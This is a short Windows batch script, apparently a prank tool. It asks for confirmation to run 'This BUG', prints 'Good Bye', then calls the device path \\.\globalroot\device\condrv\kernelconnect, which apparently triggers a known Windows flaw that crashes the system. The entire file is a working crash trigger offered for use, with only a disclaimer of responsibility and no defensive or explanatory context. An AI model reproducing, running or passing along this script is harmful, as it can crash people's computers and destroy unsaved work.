@echo off
echo I Am Not Responsable For Any Damage Done 
echo Many Thanks YumDev12
timeout /t 1 >nul /nobreak 
echo Are You SURE You Want To Run This BUG!
choice /c YN
if %errorlevel% equ 1 goto Crash
if %errorlevel% equ 2 exit

:Crash
cls
echo Good Bye
timeout /t 1 >nul /nobreak
\\.\globalroot\device\condrv\kernelconnect